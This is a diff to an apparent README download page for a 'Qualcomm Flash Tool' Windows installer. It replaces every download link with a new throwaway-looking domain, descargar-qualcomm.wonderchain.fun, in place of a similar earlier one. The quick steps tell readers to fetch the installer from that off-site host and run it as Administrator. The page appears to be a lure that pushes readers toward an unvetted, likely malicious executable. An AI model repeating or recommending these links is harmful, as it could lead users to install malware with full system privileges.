@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Qualcomm Flash Tool** for Windows.
 
 <p align="center">
-  <a href="https://descargar-qualcomm.zipzapsol.space/">
+  <a href="https://descargar-qualcomm.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Qualcomm%20Flash%20Tool-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Qualcomm Flash Tool">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[descargar-qualcomm.zipzapsol.space](https://descargar-qualcomm.zipzapsol.space/)** |
-| **Full URL** | `https://descargar-qualcomm.zipzapsol.space/` |
+| **Direct link** | **[descargar-qualcomm.wonderchain.fun](https://descargar-qualcomm.wonderchain.fun/)** |
+| **Full URL** | `https://descargar-qualcomm.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — descargar-qualcomm.zipzapsol.space](https://descargar-qualcomm.zipzapsol.space/)** (link above)
+1. Click **[Download — descargar-qualcomm.wonderchain.fun](https://descargar-qualcomm.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://descargar-qualcomm.zipzapsol.space/"><strong>⬇ Download Qualcomm Flash Tool now</strong></a></p>
+<p align="center"><a href="https://descargar-qualcomm.wonderchain.fun/"><strong>⬇ Download Qualcomm Flash Tool now</strong></a></p>
 
 ---
 
